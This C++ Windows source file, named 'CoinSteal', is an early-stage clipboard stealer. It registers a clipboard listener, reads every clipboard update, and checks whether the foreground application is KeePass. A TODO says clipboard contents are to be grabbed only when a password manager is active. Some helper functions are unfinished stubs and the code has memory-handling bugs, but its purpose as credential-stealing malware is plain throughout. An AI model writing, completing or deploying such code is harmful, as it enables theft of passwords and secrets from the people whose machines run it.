#include "CoinSteal.h"
#ifndef UNICODE
#define UNICODE
#endif 

#define CS_DEBUG 1

#include <windows.h>
#include <psapi.h> // for getmodulefilename
#include <string>
#include <iostream>

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow)
{
    // Register the window class.
    const wchar_t CLASS_NAME[] = L"Sample Window Class";

    WNDCLASS wc = { };

    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = CLASS_NAME;

    RegisterClass(&wc);

    // Create the window.
    HWND hwnd = CreateWindowEx(
        0,                              // Optional window styles.
        CLASS_NAME,                     // Window class
        L"Learn to Program Windows",    // Window text
        WS_OVERLAPPEDWINDOW,            // Window style

        // Size and position
        CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT,

        NULL,       // Parent window    
        NULL,       // Menu
        hInstance,  // Instance handle
        NULL        // Additional application data
    );

    if (hwnd == NULL)
        return 0;

    // register for listeining to the clipboard
    AddClipboardFormatListener(hwnd);

    // Run the message loop.
    MSG msg = { };
    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg); // indirectly calls windowproc 
    }

    return 0;
}

int StringContainsSubstring(std::string string, std::string substring)
{
    int pos = 0;
    int index;
    // TODO: find substring
    return 0;
}

TCHAR* GetCurrentFocusedWindowName()
{
    TCHAR moduleFileName[MAX_PATH];

    LPWSTR windowTitle{};
    HWND hwnd = GetForegroundWindow(); 
    GetWindowText(hwnd, windowTitle, 256);

    DWORD dwPID;
    GetWindowThreadProcessId(hwnd, &dwPID);

    HANDLE Handle = OpenProcess(
        PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
        FALSE,
        dwPID
    );

    if (Handle)
    {
        if (GetModuleFileNameEx(Handle, 0, moduleFileName, MAX_PATH))
        {
#ifdef CS_DEBUG
            OutputDebugString(moduleFileName);
            OutputDebugString(L"\n");

            // check if current application is keepass or firefox
            std::wstring wStr = moduleFileName;
            std::string sModuleFileName = std::string(wStr.begin(), wStr.end());

            if (StringContainsSubstring(sModuleFileName, "KeePass"))
            {
                std::cout << "keepass!" << std::endl;
            }
#endif
        }
        CloseHandle(Handle);
    }

    return moduleFileName;
}

int GetClipboardText(std::string* clipboardData)
{
    if (!OpenClipboard(nullptr))
        return 0;
    
    if (IsClipboardFormatAvailable(CF_UNICODETEXT))
    {
        HANDLE hData = GetClipboardData(CF_TEXT);
        if (hData == nullptr) {
            return 0;
        }

        // Lock the handle to get the actual text pointer
        char* pszText = static_cast<char*>(GlobalLock(hData));
        if (pszText == nullptr) {
            return 0;
        }
        // Save text in a string class instance
        *clipboardData = pszText;

        GlobalUnlock(hData);
        CloseClipboard();

        return 1;
    }
    return 0;
}

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
    switch (uMsg)
    {
    case WM_DESTROY:
        RemoveClipboardFormatListener(hwnd);
        PostQuitMessage(0);
        return 0;

    case WM_CLIPBOARDUPDATE:
        std::string clipboardData;
        if (GetClipboardText(&clipboardData)) {

            // TODO: depending on active window, only get clipboard if it is a password manager
            GetCurrentFocusedWindowName();

#ifdef CS_DEBUG
            OutputDebugString(L"CLIPBOARD UPDATED:\n");
            std::wstring stemp = std::wstring(clipboardData.begin(), clipboardData.end());
            LPCWSTR sw = stemp.c_str();
            OutputDebugString(sw);
            OutputDebugString(L"\n");
#endif
        }
        return 0;

    }
    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}